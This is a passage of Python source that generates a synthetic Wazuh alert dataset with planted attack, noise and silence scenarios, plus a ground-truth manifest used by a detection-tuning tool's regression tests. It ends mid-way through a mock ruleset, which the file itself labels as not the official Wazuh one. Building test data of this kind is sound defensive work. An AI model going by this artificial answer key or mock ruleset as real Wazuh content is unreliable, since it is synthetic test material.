"""Deterministic synthetic Wazuh 4.x dataset with planted ground truth.

:func:`generate` powers ``hushwatch demo`` (the first-5-minutes experience and the README screenshots) and the
end-to-end regression suite that proves hushwatch never suggests suppressing an attack and does not cry wolf.
It writes into ``out_dir``:

* ``alerts.json`` — NDJSON shaped exactly like Wazuh 4.x ``/var/ossec/logs/alerts/alerts.json`` (key order,
  ``+0000`` timestamps with milliseconds, ``rule.id`` strings, ``firedtimes`` per rule, ``<epoch>.<offset>`` ids,
  syslog ``full_log``/``predecoder``, eventchannel documents without ``full_log`` and with doubled backslashes,
  correlation alerts with ``rule.frequency`` and ``previous_output``), sorted by timestamp.
* ``rules/`` — a SYNTHETIC Wazuh-like ruleset (it mimics the structure of the 4.x ruleset; it is not the
  official one) plus ``local_rules.xml`` holding deliberately risky suppressions for the tuning audit.
* ``agents.json`` — a Wazuh API ``GET /agents`` response (``data.affected_items``).
* ``dispositions.csv`` — analyst verdicts (FP/BTP on the benign candidates, one TP scope).
* ``hushwatch.yml`` — the demo tenant configuration.
* ``manifest.json`` — the ground truth (:class:`DemoManifest` / :class:`PlantedScenario`).

Ground-truth semantics (per :class:`PlantedScenario`): ``expected_kinds`` — at least one finding of one of
these kinds is expected about the scenario (empty: no finding expected); ``forbidden_kinds`` — no finding of
these kinds may be produced about it; ``must_not_hide`` — the planted events are an attack: no ``tune``
suggestion may match any of them (``conditions``/``rule_ids``/``start``/``end`` select them exactly).

Determinism: one ``random.Random`` per stream, seeded from ``seed`` and the stream name (never the global
generator); ``now`` defaults to the fixed :data:`DEFAULT_NOW`, never the wall clock; no floats in the alerts.
Same arguments, byte-identical files.

Privacy: RFC 5737 addresses for everything external, RFC 1918 for internal, ``*.example`` names and obvious
placeholder users (alice, bob, svc_backup...). Nothing here comes from a real environment.
"""

from __future__ import annotations

import csv
import hashlib
import heapq
import io
import json
import math
import os
import random
import time
from collections import deque
from collections.abc import Iterator, Mapping, Sequence
from dataclasses import dataclass, field
from datetime import date, datetime, timedelta
from pathlib import Path
from typing import Any, NamedTuple
from xml.etree import ElementTree as ET
from zoneinfo import ZoneInfo

from .i18n import Entity, M, Message, register
from .inventory import AgentInfo
from .timeutil import UTC, parse_ts

__all__ = [
    "DEFAULT_NOW",
    "DEMO_SCHEMA",
    "DemoManifest",
    "PlantedScenario",
    "generate",
    "load_demo_agents",
    "load_manifest",
]

DEMO_SCHEMA = "hushwatch-demo/1"
#: Reference "now" of the demo when none is given: a Thursday, 12:00 in Buenos Aires (laptops are on).
DEFAULT_NOW = datetime(2026, 9, 24, 15, 0, 0, tzinfo=UTC)
TENANT_NAME = "demo"
TIMEZONE = "America/Argentina/Buenos_Aires"
MANAGER_NAME = "wazuh-manager"
MIN_DAYS = 10
MAX_DAYS = 90

ALERTS_FILE = "alerts.json"
RULES_DIR = "rules"
AGENTS_FILE = "agents.json"
DISPOSITIONS_FILE = "dispositions.csv"
CONFIG_FILE = "hushwatch.yml"
MANIFEST_FILE = "manifest.json"

# Planted entities (RFC 5737 = external, RFC 1918 = internal). Background traffic never reuses them.
SCANNER_IP = "10.20.0.15"  # trusted internal vulnerability scanner
BRUTE_FORCE_IP = "203.0.113.50"
SPRAY_IP = "198.51.100.23"
BEACON_IP = "192.0.2.77"
SLOW_BURN_IP = "10.30.0.99"
FIREWALL_IP = "10.10.0.1"
BASTION_IP = "10.10.5.10"
_RESERVED_IPS = frozenset({SCANNER_IP, BRUTE_FORCE_IP, SPRAY_IP, BEACON_IP, SLOW_BURN_IP})

_HOUR_MS = 3_600_000
_DAY_MS = 24 * _HOUR_MS
_MONTHS = ("Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec")

register(
    {
        "demo.summary": {
            "en": "Synthetic Wazuh dataset: {alerts} alerts from {agents} agents over {days} days, "
            "{planted} planted scenarios (seed {seed}).",
            "es": "Dataset sintético de Wazuh: {alerts} alertas de {agents} agentes en {days} días, "
            "{planted} escenarios plantados (semilla {seed}).",
        },
        "demo.scenario.noise.svc_backup_logons": {
            "en": "Nightly {user} logons on {host}: benign scheduled automation",
            "es": "Inicios de sesión nocturnos de {user} en {host}: automatización programada benigna",
        },
        "demo.scenario.noise.internal_scanner": {
            "en": "Internal vulnerability scanner {ip} triggering sshd invalid-user alerts on the web servers",
            "es": "El escáner de vulnerabilidades interno {ip} dispara alertas de usuario inexistente de sshd en "
            "los servidores web",
        },
        "demo.scenario.noise.scanner_long_urls": {
            "en": "Internal vulnerability scanner {ip} sending over-long URLs to the web servers every night",
            "es": "El escáner de vulnerabilidades interno {ip} envía URL demasiado largas a los servidores web cada "
            "noche",
        },
        "demo.scenario.noise.fim_app_logs": {
            "en": "File integrity monitoring of constantly changing application logs ({path}) on the database servers",
            "es": "Monitoreo de integridad de archivos sobre logs de aplicación que cambian constantemente "
            "({path}) en los servidores de base de datos",
        },
        "demo.scenario.trap.ssh_brute_force": {
            "en": "SSH brute force from the new external address {ip} against {host}",
            "es": "Fuerza bruta SSH desde la nueva dirección externa {ip} contra {host}",
        },
        "demo.scenario.trap.password_spray": {
            "en": "Password spray from {ip} against many accounts on {host}",
            "es": "Password spray desde {ip} contra muchas cuentas en {host}",
        },
        "demo.scenario.trap.beacon": {
            "en": "{host} beaconing to {ip} every 5 minutes",
            "es": "{host} emite beacons hacia {ip} cada 5 minutos",
        },
        "demo.scenario.trap.slow_burn": {
            "en": "Internal host {ip} probing {host} during the whole window, with a successful web attack",
            "es": "El equipo interno {ip} sondea {host} durante toda la ventana, con un ataque web exitoso",
        },
        "demo.scenario.trap.macro_powershell": {
            "en": "A Word macro started encoded PowerShell on {host}, hidden inside noisy process-creation rules",
            "es": "Una macro de Word inició PowerShell codificado en {host}, oculto dentro de reglas ruidosas de "
            "creación de procesos",
        },
        "demo.scenario.trap.noisy_critical_rule": {
            "en": "Noisy level-12 rule {rule_id}: antivirus reading LSASS memory",
            "es": "Regla ruidosa de nivel 12 {rule_id}: el antivirus lee la memoria de LSASS",
        },
        "demo.scenario.silence.dc_tampering": {
            "en": "{host} went silent right after its audit log was cleared",
            "es": "{host} quedó en silencio justo después de que se borrara su registro de auditoría",
        },
        "demo.scenario.silence.sysmon_stopped": {
            "en": "The Sysmon channel stopped on {host} while its Security channel keeps flowing",
            "es": "El canal de Sysmon se detuvo en {host} mientras su canal Security sigue llegando",
        },
        "demo.scenario.silence.fw_field_lost": {
            "en": "{host} stopped sending the destination port after a firmware upgrade",
            "es": "{host} dejó de enviar el puerto de destino tras una actualización de firmware",
        },
        "demo.scenario.silence.heartbeat_rule_dark": {
            "en": "The twice-daily SCA summary stopped on {host} while the agent keeps sending other events",
            "es": "El resumen SCA de dos veces por día se detuvo en {host} mientras el agente sigue enviando otros "
            "eventos",
        },
        "demo.scenario.silence.rule_format_changed": {
            "en": "Rule {rule_id} stopped matching on every Linux host after a PAM message format change",
            "es": "La regla {rule_id} dejó de coincidir en todos los equipos Linux tras un cambio de formato "
            "del mensaje de PAM",
        },
        "demo.scenario.silence.laptops_off_hours": {
            "en": "Laptops powered off at night, on weekends and on the holiday (no finding expected)",
            "es": "Notebooks apagadas de noche, los fines de semana y el feriado (no se espera ningún hallazgo)",
        },
        "demo.scenario.silence.no_false_alarms": {
            "en": "Every other source keeps its normal rhythm (no silence finding expected)",
            "es": "Todas las demás fuentes mantienen su ritmo normal (no se espera ningún hallazgo de silencio)",
        },
        "demo.scenario.coverage.no_sysmon": {
            "en": "{host} never sent Sysmon events while its Windows peers do",
            "es": "{host} nunca envió eventos de Sysmon, mientras que sus pares Windows sí",
        },
        "demo.scenario.coverage.no_4688": {
            "en": "{host} logs logons (4624) but never process creation (4688)",
            "es": "{host} registra inicios de sesión (4624) pero nunca creación de procesos (4688)",
        },
        "demo.scenario.pipeline.disconnected": {
            "en": "Agent {host} has been disconnected for days",
            "es": "El agente {host} está desconectado desde hace días",
        },
        "demo.scenario.pipeline.never_connected": {
            "en": "Agent {host} was enrolled but never connected",
            "es": "El agente {host} fue registrado pero nunca se conectó",
        },
        "demo.scenario.pipeline.alive_no_data": {
            "en": "Agent {host} is active (fresh keepalive) but sends no events",
            "es": "El agente {host} está activo (keepalive reciente) pero no envía eventos",
        },
        "demo.scenario.tuning.whole_rule_mute": {
            "en": "Local rule {rule_id} mutes every sshd authentication failure and breaks rule 5720",
            "es": "La regla local {rule_id} silencia todos los fallos de autenticación de sshd y rompe la regla 5720",
        },
        "demo.scenario.tuning.unanchored_user": {
            "en": "Local rule {rule_id} mutes sshd invalid users containing 'test' (substring match) and breaks 5712",
            "es": "La regla local {rule_id} silencia usuarios inexistentes de sshd que contienen 'test' "
            "(coincidencia parcial) y rompe la 5712",
        },
        "demo.scenario.tuning.attacker_field": {
            "en": "Local rule {rule_id} mutes Windows logon failures by a substring of the attacker-supplied user name",
            "es": "La regla local {rule_id} silencia fallos de inicio de sesión de Windows por una parte del nombre "
            "de usuario que controla el atacante",
        },
        "demo.scenario.tuning.expired": {
            "en": "Local rule {rule_id} is past its expiry date",
            "es": "La regla local {rule_id} superó su fecha de vencimiento",
        },
        "demo.scenario.tuning.safe_control": {
            "en": "Local rule {rule_id} is a well-scoped, current demotion (no finding expected)",
            "es": "La regla local {rule_id} es una degradación bien acotada y vigente (no se espera ningún hallazgo)",
        },
    }
)


# ---- public data model -----------------------------------------------------------------------------------------


@dataclass(frozen=True, slots=True)
class PlantedScenario:
    """One planted ground-truth item and the outcome hushwatch is expected to produce for it.

    * ``expected_kinds`` — at least one finding of one of these kinds is expected about this scenario
      (empty tuple: no finding is expected).
    * ``forbidden_kinds`` — no finding of these kinds may be produced about this scenario.
    * ``must_not_hide`` — the planted events are an attack: no ``tune`` suggestion may match any of them.
    * ``rule_ids`` / ``conditions`` / ``agent`` / ``start`` / ``end`` select the planted events exactly
      (``conditions`` are exact matches on dotted paths of the original alert document).
    * ``counts`` — alerts written per rule id for this scenario; ``count`` is their sum.
    * ``entities`` — ``(param, kind, value)`` used to render :meth:`message` with :class:`~hushwatch.i18n.Entity`.
    """

    id: str
    key: str
    category: str  # noise_safe | noise_trap | silence | coverage | pipeline | tuning
    title: str  # English title; translations under the i18n key ``demo.scenario.<key>``
    expected_kinds: tuple[str, ...] = ()
    forbidden_kinds: tuple[str, ...] = ()
    expected_verdict: str | None = None
    allowed_verdicts: tuple[str, ...] = ()
    review_required: bool | None = None
    rule_ids: tuple[str, ...] = ()
    conditions: tuple[tuple[str, str], ...] = ()
    agent: str | None = None
    log_source: str | None = None
    start: datetime | None = None
    end: datetime | None = None
    count: int = 0
    counts: tuple[tuple[str, int], ...] = ()
    must_not_hide: bool = False
    entities: tuple[tuple[str, str, str], ...] = ()
    details: Mapping[str, Any] = field(default_factory=dict)

    def message(self) -> Message:
        """The scenario title as an i18n :class:`Message` (identifying values wrapped in ``Entity``)."""
        params: dict[str, Any] = {}
        for name, kind, value in self.entities:
            params[name] = value if kind == "raw" else Entity(kind, value)
        return M(f"demo.scenario.{self.key}", self.title, **params)

    def to_dict(self) -> dict[str, Any]:
        """JSON-serializable form (datetimes as ISO-8601 UTC strings)."""
        return {
            "id": self.id,
            "key": self.key,
            "category": self.category,
            "title": self.title,
            "expected_kinds": list(self.expected_kinds),
            "forbidden_kinds": list(self.forbidden_kinds),
            "expected_verdict": self.expected_verdict,
            "allowed_verdicts": list(self.allowed_verdicts),
            "review_required": self.review_required,
            "rule_ids": list(self.rule_ids),
            "conditions": [{"field": f, "value": v} for f, v in self.conditions],
            "agent": self.agent,
            "log_source": self.log_source,
            "start": _iso_ms(self.start),
            "end": _iso_ms(self.end),
            "count": self.count,
            "counts": dict(self.counts),
            "must_not_hide": self.must_not_hide,
            "entities": [{"param": p, "kind": k, "value": v} for p, k, v in self.entities],
            "details": _jsonable(self.details),
        }

    @classmethod
    def from_dict(cls, raw: Mapping[str, Any]) -> PlantedScenario:
        """Inverse of :meth:`to_dict`. Raises ``ValueError`` on malformed input."""
        try:
            return cls(
                id=str(raw["id"]),
                key=str(raw["key"]),
                category=str(raw["category"]),
                title=str(raw["title"]),
                expected_kinds=tuple(str(k) for k in raw.get("expected_kinds") or ()),
                forbidden_kinds=tuple(str(k) for k in raw.get("forbidden_kinds") or ()),
                expected_verdict=_opt_str(raw.get("expected_verdict")),
                allowed_verdicts=tuple(str(v) for v in raw.get("allowed_verdicts") or ()),
                review_required=_opt_bool(raw.get("review_required")),
                rule_ids=tuple(str(r) for r in raw.get("rule_ids") or ()),
                conditions=tuple((str(c["field"]), str(c["value"])) for c in raw.get("conditions") or ()),
                agent=_opt_str(raw.get("agent")),
                log_source=_opt_str(raw.get("log_source")),
                start=_opt_ts(raw.get("start")),
                end=_opt_ts(raw.get("end")),
                count=int(raw.get("count") or 0),
                counts=tuple((str(k), int(v)) for k, v in dict(raw.get("counts") or {}).items()),
                must_not_hide=bool(raw.get("must_not_hide", False)),
                entities=tuple((str(e["param"]), str(e["kind"]), str(e["value"])) for e in raw.get("entities") or ()),
                details=dict(raw.get("details") or {}),
            )
        except (KeyError, TypeError, ValueError, AttributeError) as exc:
            raise ValueError(f"invalid planted scenario entry: {exc!r}") from None


@dataclass(slots=True)
class DemoManifest:
    """Where the demo files are and what was planted in them (the ground truth)."""

    out_dir: Path
    alerts_path: Path
    rules_dir: Path
    agents_path: Path
    dispositions_path: Path
    config_path: Path
    manifest_path: Path
    ground_truth: list[PlantedScenario]
    seed: int = 7
    days: int = 21
    scale: float = 1.0
    agents: int = 40
    now: datetime = DEFAULT_NOW
    start: datetime = DEFAULT_NOW - timedelta(days=21)
    timezone: str = TIMEZONE
    tenant: str = TENANT_NAME
    holiday: date | None = None
    alerts: int = 0
    rule_counts: dict[str, int] = field(default_factory=dict)
    agent_names: list[str] = field(default_factory=list)
    schema: str = DEMO_SCHEMA

    @property
    def scenarios(self) -> list[PlantedScenario]:
        """Alias of :attr:`ground_truth`."""
        return self.ground_truth

    def scenario(self, key_or_id: str) -> PlantedScenario:
        """Return the planted scenario with this id (``"d"``) or key (``"trap.ssh_brute_force"``)."""
        for item in self.ground_truth:
            if key_or_id in (item.id, item.key):
                return item
        raise KeyError(key_or_id)

    def summary(self) -> Message:
        """One-line i18n description of the dataset."""
        return M(
            "demo.summary",
            alerts=self.alerts,
            agents=len(self.agent_names),
            days=self.days,
            planted=len(self.ground_truth),
            seed=self.seed,
        )

    def to_dict(self) -> dict[str, Any]:
        """JSON-serializable form; paths are stored relative to ``out_dir`` so the directory can be moved."""
        return {
            "schema": self.schema,
            "seed": self.seed,
            "days": self.days,
            "scale": self.scale,
            "agents": self.agents,
            "now": _iso_ms(self.now),
            "start": _iso_ms(self.start),
            "timezone": self.timezone,
            "tenant": self.tenant,
            "holiday": self.holiday.isoformat() if self.holiday else None,
            "alerts": self.alerts,
            "files": {
                "alerts": _rel(self.alerts_path, self.out_dir),
                "rules": _rel(self.rules_dir, self.out_dir),
                "agents": _rel(self.agents_path, self.out_dir),
                "dispositions": _rel(self.dispositions_path, self.out_dir),
                "config": _rel(self.config_path, self.out_dir),
            },
            "agent_names": list(self.agent_names),
            "rule_counts": dict(sorted(self.rule_counts.items(), key=lambda kv: int(kv[0]))),
            "ground_truth": [s.to_dict() for s in self.ground_truth],
        }


def load_manifest(path: str | Path) -> DemoManifest:
    """Load a ``manifest.json`` written by :func:`generate` (``path`` may be the file or its directory).

    Relative file paths inside the manifest are resolved against the manifest's directory. Raises
    ``ValueError`` when the file is not a hushwatch demo manifest and ``OSError`` when it cannot be read.
    """
    manifest_path = Path(path)
    if manifest_path.is_dir():
        manifest_path = manifest_path / MANIFEST_FILE
    raw = json.loads(manifest_path.read_text(encoding="utf-8"))
    if not isinstance(raw, dict) or raw.get("schema") != DEMO_SCHEMA:
        raise ValueError(f"{manifest_path}: not a hushwatch demo manifest (expected schema {DEMO_SCHEMA})")
    base = manifest_path.parent
    try:
        files = {
            key: _inside(base, str(raw["files"][key]))
            for key in ("alerts", "rules", "agents", "dispositions", "config")
        }
        now = _opt_ts(raw["now"])
        start = _opt_ts(raw["start"])
        if now is None or start is None:
            raise ValueError("missing now/start")
        holiday_raw = raw.get("holiday")
        return DemoManifest(
            out_dir=base,
            alerts_path=files["alerts"],
            rules_dir=files["rules"],
            agents_path=files["agents"],
            dispositions_path=files["dispositions"],
            config_path=files["config"],
            manifest_path=manifest_path,
            ground_truth=[PlantedScenario.from_dict(item) for item in raw.get("ground_truth") or ()],
            seed=int(raw["seed"]),
            days=int(raw["days"]),
            scale=float(raw["scale"]),
            agents=int(raw["agents"]),
            now=now,
            start=start,
            timezone=str(raw["timezone"]),
            tenant=str(raw["tenant"]),
            holiday=date.fromisoformat(str(holiday_raw)) if holiday_raw else None,
            alerts=int(raw["alerts"]),
            rule_counts={str(k): int(v) for k, v in dict(raw.get("rule_counts") or {}).items()},
            agent_names=[str(n) for n in raw.get("agent_names") or ()],
        )
    except (KeyError, TypeError, ValueError) as exc:
        raise ValueError(f"{manifest_path}: invalid demo manifest ({exc!r})") from None


def load_demo_agents(path: str | Path) -> list[AgentInfo]:
    """Parse the demo ``agents.json`` (a Wazuh API ``GET /agents`` response) into :class:`AgentInfo` objects.

    Mirrors the API semantics: the manager's ``9999-12-31T23:59:59Z`` keepalive sentinel becomes ``None`` and
    every field except id, name and status is optional.
    """
    raw = json.loads(Path(path).read_text(encoding="utf-8"))
    data = raw.get("data") if isinstance(raw, dict) else None
    items = data.get("affected_items") if isinstance(data, dict) else None
    agents: list[AgentInfo] = []
    if not isinstance(items, list):
        return agents
    for item in items:
        if not isinstance(item, dict) or "id" not in item or "name" not in item:
            continue
        keepalive = item.get("lastKeepAlive")
        last = None if not keepalive or str(keepalive).startswith("9999") else parse_ts(keepalive)
        added = parse_ts(item.get("dateAdd")) if item.get("dateAdd") else None
        raw_os = item.get("os")
        os_info: dict[str, Any] = raw_os if isinstance(raw_os, dict) else {}
        platform = os_info.get("platform")
        agents.append(
            AgentInfo(
                id=str(item["id"]),
                name=str(item["name"]),
                status=str(item.get("status", "unknown")),
                last_keepalive=last,
                date_add=added,
                platform=str(platform).lower() if platform else None,
                os_name=str(os_info["name"]) if os_info.get("name") else None,
                groups=tuple(str(g) for g in item["group"]) if isinstance(item.get("group"), list) else (),
                version=str(item["version"]) if item.get("version") else None,
                node=str(item["node_name"]) if item.get("node_name") else None,
                extra={"ip": str(item["ip"])} if item.get("ip") else {},
            )
        )
    return agents


# ---- small helpers ---------------------------------------------------------------------------------------------


def _iso_ms(ts: datetime | None) -> str | None:
    if ts is None:
        return None
    return ts.astimezone(UTC).strftime("%Y-%m-%dT%H:%M:%S.") + f"{ts.microsecond // 1000:03d}Z"


def _opt_ts(value: Any) -> datetime | None:
    if value in (None, ""):
        return None
    parsed = parse_ts(value)
    if parsed is None:
        raise ValueError(f"bad timestamp {value!r}")
    return parsed


def _inside(base: Path, relative: str) -> Path:
    """Resolve a manifest file entry, refusing anything that escapes the manifest's directory."""
    candidate = (base / relative).resolve()
    root = base.resolve()
    if candidate != root and root not in candidate.parents:
        raise ValueError(f"file entry {relative!r} points outside {base}")
    return base / relative


def _opt_str(value: Any) -> str | None:
    return None if value is None else str(value)


def _opt_bool(value: Any) -> bool | None:
    return None if value is None else bool(value)


def _rel(path: Path, base: Path) -> str:
    try:
        return path.relative_to(base).as_posix()
    except ValueError:
        return str(path)


def _jsonable(value: Any) -> Any:
    if isinstance(value, datetime):
        return _iso_ms(value)
    if isinstance(value, date):
        return value.isoformat()
    if isinstance(value, Mapping):
        return {str(k): _jsonable(v) for k, v in value.items()}
    if isinstance(value, (list, tuple, set, frozenset)):
        items = [_jsonable(v) for v in value]
        return sorted(items, key=str) if isinstance(value, (set, frozenset)) else items
    return value


def _write_private(path: Path, text: str) -> None:
    """Write ``text`` to ``path`` readable by the owner only (0600), also when the file already exists; a symlink
    in its place is refused (O_NOFOLLOW) rather than followed."""
    flags = os.O_WRONLY | os.O_CREAT | os.O_TRUNC | getattr(os, "O_NOFOLLOW", 0) | getattr(os, "O_CLOEXEC", 0)
    fd = os.open(path, flags, 0o600)
    with os.fdopen(fd, "w", encoding="utf-8") as handle:
        if hasattr(os, "fchmod"):
            os.fchmod(fd, 0o600)  # an existing file keeps its old mode otherwise
        handle.write(text)


def _ms(ts: datetime) -> int:
    return int(ts.timestamp()) * 1000 + ts.microsecond // 1000


def _dt(ms: int) -> datetime:
    return datetime.fromtimestamp(ms // 1000, tz=UTC) + timedelta(milliseconds=ms % 1000)


def _stream_rng(seed: int, name: str) -> random.Random:
    """An independent, reproducible RNG per stream (adding a stream never shifts the others)."""
    digest = hashlib.sha256(f"hushwatch-demo\x1f{seed}\x1f{name}".encode()).digest()
    return random.Random(int.from_bytes(digest[:8], "big"))


def _poisson(rng: random.Random, lam: float) -> int:
    if lam <= 0.0:
        return 0
    if lam < 30.0:
        limit = math.exp(-lam)
        k = 0
        p = rng.random()
        while p > limit:
            k += 1
            p *= rng.random()
        return k
    return max(0, int(rng.gauss(lam, math.sqrt(lam)) + 0.5))


def _wazuh_ts(ms: int) -> str:
    t = time.gmtime(ms // 1000)
    return (
        f"{t.tm_year:04d}-{t.tm_mon:02d}-{t.tm_mday:02d}T{t.tm_hour:02d}:{t.tm_min:02d}:{t.tm_sec:02d}."
        f"{ms % 1000:03d}+0000"
    )


def _syslog_ts(ms: int) -> str:
    """Classic syslog header time (``Sep  4 09:05:01``), locale independent; hosts log in UTC."""
    t = time.gmtime(ms // 1000)
    return f"{_MONTHS[t.tm_mon - 1]} {t.tm_mday:>2} {t.tm_hour:02d}:{t.tm_min:02d}:{t.tm_sec:02d}"


def _win_time(ms: int, rng: random.Random) -> str:
    t = time.gmtime(ms // 1000)
    frac = (ms % 1000) * 10_000 + rng.randrange(10_000)
    return f"{t.tm_year:04d}-{t.tm_mon:02d}-{t.tm_mday:02d}T{t.tm_hour:02d}:{t.tm_min:02d}:{t.tm_sec:02d}.{frac:07d}Z"


def _sysmon_time(ms: int) -> str:
    t = time.gmtime(ms // 1000)
    return (
        f"{t.tm_year:04d}-{t.tm_mon:02d}-{t.tm_mday:02d} {t.tm_hour:02d}:{t.tm_min:02d}:{t.tm_sec:02d}.{ms % 1000:03d}"
    )


def _winpath(path: str) -> str:
    """Eventchannel values keep JSON-escaped backslashes: the decoded value holds DOUBLED backslashes."""
    return path.replace("\\", "\\\\")


def _hex(rng: random.Random, nbytes: int) -> str:
    return f"{rng.getrandbits(nbytes * 8):0{nbytes * 2}x}"


def _guid(rng: random.Random) -> str:
    h = _hex(rng, 16)
    return f"{{{h[:8]}-{h[8:12]}-{h[12:16]}-{h[16:20]}-{h[20:]}}}"


# ---- synthetic ruleset -------------------------------------------------------------------------------------------
#
# The rule files are written verbatim from the XML below, and the ``rule`` objects of the alerts are derived by
# parsing the very same XML, so the ruleset and the alerts can never disagree. The rules mimic the structure of the
# Wazuh 4.x ruleset (level-0 grouping parents, if_sid chains, frequency rules correlating through if_matched_sid /
# if_matched_group, <var>, options, MITRE ids, compliance groups); they are written for this demo and are not the
# official ruleset. local_rules.xml holds existing tuning debt for the audit: four risky rules and one fine one.

_MITRE: dict[str, tuple[tuple[str, ...], str]] = {
    "T1110.001": (("Credential Access",), "Password Guessing"),
    "T1021.004": (("Lateral Movement",), "SSH"),
    "T1110": (("Credential Access",), "Brute Force"),
    "T1078": (("Defense Evasion", "Persistence", "Privilege Escalation", "Initial Access"), "Valid Accounts"),
    "T1021": (("Lateral Movement",), "Remote Services"),
    "T1548.003": (("Privilege Escalation", "Defense Evasion"), "Sudo and Sudo Caching"),
    "T1059.001": (("Execution",), "PowerShell"),
    "T1071": (("Command and Control",), "Application Layer Protocol"),
    "T1003.001": (("Credential Access",), "LSASS Memory"),
    "T1070.001": (("Defense Evasion",), "Clear Windows Event Logs"),
    "T1190": (("Initial Access",), "Exploit Public-Facing Application"),
    "T1595.002": (("Reconnaissance",), "Vulnerability Scanning"),
    "T1543.003": (("Persistence", "Privilege Escalation"), "Windows Service"),
}
# Compliance group prefixes are moved out of rule.groups into their own arrays (alphabetical key order).
_COMPLIANCE = (
    ("cis_", "cis"),
    ("gdpr_", "gdpr"),
    ("gpg13_", "gpg13"),
    ("hipaa_", "hipaa"),
    ("nist_800_53_", "nist_800_53"),
    ("pci_dss_", "pci_dss"),
    ("tsc_", "tsc"),
)
_SYNTHETIC_HEADER = (
    "<!-- Synthetic demo ruleset written by 'hushwatch demo'. It mimics the structure of the Wazuh 4.x ruleset so\n"
    "     the demo can be analyzed offline; it is NOT the official Wazuh ruleset. -->\n"
)
_LOCAL_RULES = "local_rules.xml"

_RULE_FILES: dict[str, str] = {
    "0015-ossec_rules.xml": r"""
<group name="ossec,">
  <rule id="500" level="0">
    <category>ossec</category>
    <description>Grouping of wazuh rules.</description>
  </rule>
  <rule id="506" level="3">
    <if_sid>500</if_sid>
    <match>^ossec: Agent stopped</match>
    <description>Wazuh agent stopped.</description>
    <group>agent_stopped,gpg13_10.1,pci_dss_10.6.1,</group>
  </rule>
  <rule id="550" level="7">
    <category>ossec</category>
    <decoded_as>syscheck_integrity_changed</decoded_as>
    <description>Integrity checksum changed.</description>
    <group>syscheck,syscheck_entry_modified,syscheck_file,gdpr_II_5.1.f,gpg13_4.11,hipaa_164.312.c.1,hipaa_164.312.c.2,nist_800_53_SI.7,pci_dss_11.5,tsc_PI1.4,tsc_PI1.5,tsc_CC6.1,tsc_CC6.8,tsc_CC7.2,tsc_CC7.3,</group>
  </rule>
  <rule id="553" level="7">
    <category>ossec</category>
    <decoded_as>syscheck_deleted</decoded_as>
    <description>File deleted.</description>
    <group>syscheck,syscheck_entry_deleted,syscheck_file,gdpr_II_5.1.f,gpg13_4.11,hipaa_164.312.c.1,nist_800_53_SI.7,pci_dss_11.5,tsc_PI1.4,tsc_CC6.1,</group>
  </rule>
  <rule id="554" level="5">
    <category>ossec</category>
    <decoded_as>syscheck_new_entry</decoded_as>
    <description>File added to the system.</description>
    <group>syscheck,syscheck_entry_added,syscheck_file,gdpr_II_5.1.f,gpg13_4.11,hipaa_164.312.c.1,nist_800_53_SI.7,pci_dss_11.5,tsc_PI1.4,tsc_CC6.1,</group>
  </rule>
</group>
""",
    "0020-syslog_rules.xml": r"""
<group name="syslog,sudo,">
  <rule id="5400" level="0">
    <decoded_as>sudo</decoded_as>
    <description>Initial group for sudo messages.</description>
  </rule>
  <rule id="5402" level="3">
    <if_sid>5400</if_sid>
    <match> ; USER=root ; COMMAND=</match>
    <description>Successful sudo to ROOT executed.</description>
    <mitre>
      <id>T1548.003</id>
    </mitre>
    <group>gdpr_IV_32.2,gpg13_7.6,gpg13_7.8,gpg13_7.13,hipaa_164.312.b,nist_800_53_AU.14,nist_800_53_AC.7,nist_800_53_AC.6,pci_dss_10.2.5,pci_dss_10.2.2,tsc_CC6.8,tsc_CC7.2,tsc_CC7.3,</group>
  </rule>
</group>
""",
    "0040-firewall_rules.xml": r"""
<group name="firewall,">
  <rule id="4100" level="0">
    <decoded_as>edgefw</decoded_as>
    <description>Firewall rules grouped.</description>
  </rule>
  <rule id="4101" level="5">
    <if_sid>4100</if_sid>
    <action>^deny|^drop</action>
    <description>Firewall drop event.</description>
    <group>firewall_drop,gpg13_4.12,hipaa_164.312.a.1,nist_800_53_SC.7,pci_dss_1.4,tsc_CC6.7,tsc_CC6.8,</group>
  </rule>
  <rule id="4151" level="10" frequency="18" timeframe="45" ignore="240">
    <if_matched_sid>4101</if_matched_sid>
    <same_srcip />
    <description>Multiple Firewall drop events from same source.</description>
    <group>multiple_drops,gpg13_4.12,hipaa_164.312.a.1,nist_800_53_SC.7,pci_dss_1.4,pci_dss_10.6.1,tsc_CC6.7,</group>
  </rule>
</group>
""",
    "0085-pam_rules.xml": r"""
<group name="pam,syslog,">
  <rule id="5500" level="0">
    <decoded_as>pam</decoded_as>
    <description>Grouping of the pam_unix rules.</description>
  </rule>
  <rule id="5501" level="3">
    <if_sid>5500</if_sid>
    <match>session opened for user </match>
    <description>PAM: Login session opened.</description>
    <mitre>
      <id>T1078</id>
    </mitre>
    <group>authentication_success,gdpr_IV_32.2,gpg13_7.1,gpg13_7.2,hipaa_164.312.b,nist_800_53_AU.14,nist_800_53_AC.7,pci_dss_10.2.5,tsc_CC6.8,tsc_CC7.2,tsc_CC7.3,</group>
  </rule>
  <rule id="5502" level="3">
    <if_sid>5500</if_sid>
    <match>session closed for user </match>
    <description>PAM: Login session closed.</description>
    <group>gdpr_IV_32.2,gpg13_7.8,gpg13_7.9,hipaa_164.312.b,nist_800_53_AU.14,nist_800_53_AC.7,pci_dss_10.2.5,tsc_CC6.8,tsc_CC7.2,tsc_CC7.3,</group>
  </rule>
</group>
""",
    "0095-sshd_rules.xml": r"""
<group name="syslog,sshd,">
  <rule id="5700" level="0">
    <decoded_as>sshd</decoded_as>
    <description>SSHD messages grouped.</description>
  </rule>
  <rule id="5710" level="5">
    <if_sid>5700</if_sid>
    <match>illegal user|invalid user</match>
    <description>sshd: Attempt to login using a non-existent user</description>
    <mitre>
      <id>T1110.001</id>
      <id>T1021.004</id>
    </mitre>
    <group>authentication_failed,gdpr_IV_35.7.d,gdpr_IV_32.2,gpg13_7.1,hipaa_164.312.b,invalid_login,nist_800_53_AU.14,nist_800_53_AC.7,nist_800_53_AU.6,pci_dss_10.2.4,pci_dss_10.2.5,pci_dss_10.6.1,tsc_CC6.1,tsc_CC6.8,tsc_CC7.2,tsc_CC7.3,</group>
  </rule>
  <!-- Correlation: 8 invalid-user attempts from the same source within 2 minutes. -->
  <rule id="5712" level="10" frequency="8" timeframe="120" ignore="60">
    <if_matched_sid>5710</if_matched_sid>
    <same_srcip />
    <description>sshd: brute force trying to get access to the system. Non existent user.</description>
    <mitre>
      <id>T1110</id>
    </mitre>
